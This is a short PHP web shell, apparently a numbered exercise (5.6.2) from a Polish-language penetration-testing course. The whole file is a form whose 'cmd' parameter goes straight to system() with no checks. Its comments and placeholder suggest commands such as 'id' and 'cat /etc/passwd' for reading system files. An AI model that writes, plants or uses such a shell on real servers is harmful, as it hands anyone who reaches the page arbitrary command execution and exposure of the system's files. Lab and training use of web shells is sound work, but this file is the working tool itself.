<html>
<body>
<h3>5.6.2 - Command execution shell</h3>
<form method="GET">
  <input type="text" name="cmd" autofocus id="cmd" size="80"
         placeholder="np. id; uname -a; cat /etc/passwd">
  <input type="submit" value="Execute">
</form>
<pre>
<?php
// Wykonuje dowolne polecenie przekazane w parametrze ?cmd=
// np. /cmd.php?cmd=id   albo   /cmd.php?cmd=cat%20/etc/passwd
if (isset($_GET['cmd'])) {
    echo "\$ " . htmlspecialchars($_GET['cmd']) . "\n\n";
    system($_GET['cmd'] . ' 2>&1');
}
?>
</pre>
</body>
</html>
